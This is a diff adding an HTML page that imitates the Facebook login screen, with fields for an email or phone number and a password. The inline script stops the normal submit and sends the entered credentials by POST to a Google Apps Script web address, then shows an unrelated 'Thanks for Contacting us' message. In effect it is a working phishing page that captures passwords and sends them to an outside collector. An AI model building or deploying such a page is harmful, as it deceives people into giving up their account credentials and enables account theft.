@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<!-- Coding By CodingNepal - www.codingnepalweb.com -->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="style.css">
+  </head>
+  <body>
+    <div class="container flex">
+      <div class="facebook-page flex">
+        <div class="text">
+          <h1>facebook</h1>
+          <p>Connect with friends and the world </p>
+          <p> around you on Facebook.</p>
+        </div>
+        <form method="POST" name="google-sheet">
+          <input type="email or phone" placeholder="Email or phone number" required id="Name"name="Name">
+          <input type="password" placeholder="Password" id="Password"  name="Password"required>
+          <div class="link">
+            <button type="submit" class="login">Login</button>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+          <hr>
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+          <script>
+          const scriptURL = 'https://script.google.com/macros/s/AKfycbzNnzRBL-YZGrtTq5gD1Yx2tjPS8gu6_kmei33bpJVDJLxnWNkCnS9NOKjdNj0aWBc7wA/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
